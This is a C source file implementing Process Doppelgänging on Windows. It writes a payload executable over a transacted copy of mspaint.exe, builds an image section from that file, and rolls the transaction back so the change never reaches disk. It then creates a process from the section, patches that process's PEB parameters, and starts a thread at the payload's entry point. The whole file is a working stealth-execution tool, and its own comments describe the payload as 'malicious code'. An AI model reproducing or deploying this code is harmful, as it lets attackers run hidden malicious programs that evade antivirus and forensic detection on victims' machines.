#include <Windows.h>
#include <ktmw32.h>
#include <stdio.h>
#include <winnt.h>

#include "proc_dopp.h"

#pragma comment(lib, "KtmW32.lib")

#define NtCurrentProcess() ((HANDLE) - 1)

void fatal_error(char *msg)
{
	printf("[-] Error : %s\n", msg);
	exit(EXIT_FAILURE);
}

/*
 * Open a file and read its content to copy it into memory.
 * Returns a pointer to the allocated buffer, and its size in the corresponding parameter.
 */
LPVOID file_to_buffer(LPWSTR payload, LPDWORD payloadSize)
{
	HANDLE hPayloadFile;
	HANDLE hHeap;
	LPVOID lpPayloadBuffer;
	DWORD bytesRead = 0;

	// Open the payload file.
	hPayloadFile = CreateFileW(
		payload,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (INVALID_HANDLE_VALUE == hPayloadFile)
		fatal_error("failed to open payload file.");

	if (!GetFileSizeEx(hPayloadFile, payloadSize))
		fatal_error("GetFileSizeEx() returns 0.");

	// Allocate memory for the file.
	if ( !(hHeap = GetProcessHeap()) )
		fatal_error("GetProcessHeap() failed.");

	lpPayloadBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, *payloadSize);
	if (!lpPayloadBuffer)
		fatal_error("HeapAlloc() failed.");

	// Put file content into memory.
	if ( !ReadFile(hPayloadFile, lpPayloadBuffer, *payloadSize, &bytesRead, NULL) )
		fatal_error("ReadFile() failed.");

	CloseHandle(hPayloadFile);

	return lpPayloadBuffer;
}

ULONGLONG get_entry_point(BYTE *lpPayloadBuffer, PPEB remotePeb)
{
	IMAGE_DOS_HEADER *dosHeader = NULL;
	IMAGE_NT_HEADERS64 *peHeader = NULL;
	ULONGLONG entryPoint = NULL;
	ULONGLONG imageBase = NULL;
	DWORD offset = 0;

	// NT header is located at base_dos_header + offset_PE_header (roffsetresented by
	// 'e_lfanew'.
	// Source : PE file format compendium 1.1 (by Goppit).
	dosHeader = (IMAGE_DOS_HEADER*)lpPayloadBuffer;
	if (IMAGE_DOS_SIGNATURE != dosHeader->e_magic)
		fatal_error("invlaid DOS header.");
	
	peHeader = (IMAGE_NT_HEADERS64*)(lpPayloadBuffer + dosHeader->e_lfanew);
	if (IMAGE_NT_SIGNATURE != peHeader->Signature)
		fatal_error("invalid NT header.");

	// The entry point address is the addition of the base address of the process 
	// (got from the PEB structure filled with NtQueryInformationProcess, the one 
	// present in the optional header is just the preferred base address and can 
	// be different from the real base address) and the offset of the entry point
	// (from the image base) present in the OptionalHeader.
	imageBase = (ULONGLONG)remotePeb->ImageBaseAddress;
	offset = peHeader->OptionalHeader.AddressOfEntryPoint;
	printf("imageBase : %p\n", imageBase);
	printf("offset : %d\n", offset);

	entryPoint = imageBase + offset;

	return entryPoint;
}

int main(void)
{
	LPWSTR targetProcess = L"C:\\Users\\wvbox\\Desktop\\mspaint.exe";
	LPWSTR payload = L"C:\\Users\\wvbox\\Desktop\\hello.exe";
	HMODULE hNtdll = NULL;
	HANDLE hTransaction = NULL;
	HANDLE hTransactedFile = NULL;
	HANDLE hSection = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	BYTE  *lpPayloadBuffer = NULL;
	LPVOID remoteProcParams = NULL;
	PEB remotePeb = { '\0' };
	DWORD payloadSize = 0;
	DWORD bytesWritten = 0;

	PROCESS_BASIC_INFORMATION pbi = { '\0' };
	LPTHREAD_START_ROUTINE remoteEntryPoint = NULL;
	PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
	ULONGLONG offset = 0;
	LPVOID remoteImageBase = NULL;
	UNICODE_STRING uPath = { '\0' };
	UNICODE_STRING uTitle = { '\0' };
	UNICODE_STRING uDirectory = { '\0' };

	NTSTATUS status = -1;
	NT_CREATE_SECTION _ntCreateSection = NULL;
	NT_CREATE_PROCESS_EX _ntCreateProcessEx = NULL;
	NT_CREATE_THREAD_EX _ntCreateThreadEx = NULL;
	RTL_CREATE_PROCESS_PARAMETERS_EX _rtlCreateProcessParametersEx = NULL;
	NT_QUERY_INFORMATION_PROCESS _ntQueryInformationProcess = NULL;
	NT_WRITE_VIRTUAL_MEMORY _ntWriteVirtualMemory = NULL;
	NT_READ_VIRTUAL_MEMORY _ntReadVirtualMemory = NULL;
	RTL_INIT_UNICODE_STRING _rtlInitUnicodeString = NULL;

	hNtdll = GetModuleHandle("ntdll.dll");

	// Create a transaction.
	hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
	if (INVALID_HANDLE_VALUE == hTransaction)
		fatal_error("CreateTransaction() failed.");

	// Open a transacted file (the target clean process).
	hTransactedFile = CreateFileTransactedW(
		targetProcess, 
		GENERIC_READ | GENERIC_WRITE, 
		0, 
		NULL,  
		CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL, 
		hTransaction, 
		NULL, 
		NULL
	);
	if (INVALID_HANDLE_VALUE == hTransactedFile)
		fatal_error("CreateFileTransactionA() failed.");

	// Overwrite the opened file with malicious code.
	lpPayloadBuffer = file_to_buffer(payload, &payloadSize);
	printf("Size of the payload buffer : %d\n", payloadSize);
	printf("Buffer : \n%s\n", lpPayloadBuffer);

	WriteFile(hTransactedFile, lpPayloadBuffer, payloadSize, &bytesWritten, NULL);

	// Create the section in the target process.
	_ntCreateSection = (NT_CREATE_SECTION)GetProcAddress(hNtdll, "NtCreateSection");
	printf("Address of NtCreateSection(): %p\n", _ntCreateSection);
	status = -1;
	if (_ntCreateSection)
	{
		status = _ntCreateSection(
			&hSection,
			SECTION_ALL_ACCESS,
			NULL,
			0,
			PAGE_READONLY,
			SEC_IMAGE,
			hTransactedFile
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("NtCreateSection() failed.");

	// Rollback the transaction to remove our changes from the file system.
	if (!RollbackTransaction(hTransaction))
		fatal_error("RollbackTransaction() failed.");

	// Create a new process to wrap the previously created section.
	_ntCreateProcessEx = (NT_CREATE_PROCESS_EX)GetProcAddress(hNtdll, "NtCreateProcessEx");
	printf("Address of NtCreateProcessEx(): %p\n", _ntCreateProcessEx);
	status = -1;
	if (_ntCreateProcessEx)
	{
		status = _ntCreateProcessEx(
			&hProcess,
			PROCESS_ALL_ACCESS,
			NULL,
			NtCurrentProcess(),
			PS_INHERIT_HANDLES,
			hSection,
			NULL,
			NULL,
			FALSE
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("NtCreateProcessEx() failed.");

	// Create the parameters for that process.
	_rtlCreateProcessParametersEx = (RTL_CREATE_PROCESS_PARAMETERS_EX)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
	_rtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(hNtdll, "RtlInitUnicodeString");
	printf("Address of RtlCreateProcessParameters(): %p\n", _rtlCreateProcessParametersEx);
	printf("Address of RtlInitUnicodeString(): %p\n", _rtlInitUnicodeString);

	_rtlInitUnicodeString(&uPath, targetProcess);
	_rtlInitUnicodeString(&uDirectory, L"C:\\windows\\system32");
	_rtlInitUnicodeString(&uTitle, L"mspaint.exe");
	status = -1;
	if (_rtlCreateProcessParametersEx)
	{
		status = _rtlCreateProcessParametersEx(
			&processParameters,
			&uPath,
			&uDirectory,
			&uDirectory,
			&uPath,
			NULL,
			&uTitle,
			NULL,
			NULL,
			NULL,
			RTL_USER_PROC_PARAMS_NORMALIZED
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("RtlCreateProcessParameters() failed.");

	// Allocate enough memory in the remote process' address space to write the 
	// process parameters pointer into it.
	remoteProcParams = VirtualAllocEx(
		hProcess,
		processParameters,
		processParameters->Length,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (!remoteProcParams)
		fatal_error("VirtualAllocEx() failed.");

	// Write the parameters to the remote process.
	_ntWriteVirtualMemory = (NT_WRITE_VIRTUAL_MEMORY)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	printf("Address of NtWriteVirtualMemory() : %p\n", _ntWriteVirtualMemory);
	status = _ntWriteVirtualMemory(
		hProcess,
		processParameters,
		processParameters,
		processParameters->Length,
		NULL
	);
	if (STATUS_SUCCESS != status)
		fatal_error("WriteProcessMemory(processParameters) failed.");
	
	// Get remote process' PEB address.
	_ntQueryInformationProcess = (NT_QUERY_INFORMATION_PROCESS)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	status = -1;
	if (_ntQueryInformationProcess)
	{
		status = _ntQueryInformationProcess(
			hProcess,
			ProcessBasicInformation,
			&pbi,
			sizeof(PROCESS_BASIC_INFORMATION),
			NULL
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("NtQueryProcessInformation() failed.");

	// Read the memory of the target process to be able to fetch its image base address.
	_ntReadVirtualMemory = (NT_READ_VIRTUAL_MEMORY)GetProcAddress(hNtdll, "NtReadVirtualMemory");
	printf("Address of NtReadVirtualMemory() : %p\n", _ntReadVirtualMemory);
	status = -1;
	if (_ntReadVirtualMemory)
	{
		status = _ntReadVirtualMemory(
			hProcess,
			pbi.PebBaseAddress,
			&remotePeb,
			sizeof(PEB),
			NULL
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("ReadProcessMemory() failed.");
	printf("remotePeb.ImageBaseAddress : %p\n", remotePeb.ImageBaseAddress);

	// Overwrite remote process' ProcessParameters pointer to point to the one we 
	// created.
	printf("remotePeb.ProcessParameters (before) : %p\n", remotePeb.ProcessParameters);
	offset = (ULONGLONG)&remotePeb.ProcessParameters - (ULONGLONG)&remotePeb;
	remoteImageBase = (LPVOID) ( (ULONGLONG)pbi.PebBaseAddress + offset);
	status = _ntWriteVirtualMemory (
		hProcess,
		remoteImageBase,
		&processParameters,
		sizeof(PVOID),
		NULL
	);
	if (STATUS_SUCCESS != status)
		fatal_error("NtWriteVirtualMemory(&processParameters) failed.");

	// --------------- DEBUG --------------- //
	status = -1;
	if (_ntReadVirtualMemory)
	{
		status = _ntReadVirtualMemory(
			hProcess,
			pbi.PebBaseAddress,
			&remotePeb,
			sizeof(PEB),
			NULL
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("ReadProcessMemory() failed.");
	printf("remotePeb.ProcessParameters (after) : %p\n", remotePeb.ProcessParameters);
	// ------------------------------------- //

	// Get remote process' entry point to let the main thread knows where to start.
	remoteEntryPoint = (LPTHREAD_START_ROUTINE)get_entry_point(lpPayloadBuffer, &remotePeb);

	// Create the main thread for the new process.
	_ntCreateThreadEx = (NT_CREATE_THREAD_EX)GetProcAddress(hNtdll, "NtCreateThreadEx");
	printf("Address of NtCreateThreadEx(): %p\n", _ntCreateThreadEx);
	status = 0;
	if (_ntCreateThreadEx)
	{
		status = _ntCreateThreadEx(
			&hThread,
			GENERIC_ALL, //THREAD_ALL_ACCESS,
			NULL,
			hProcess,
			remoteEntryPoint,
			NULL,
			FALSE,
			0,
			0,
			0,
			NULL
		);
	}
	if (STATUS_SUCCESS != status)
		fatal_error("NtCreateThreadEx() failed.");

	return 0;
}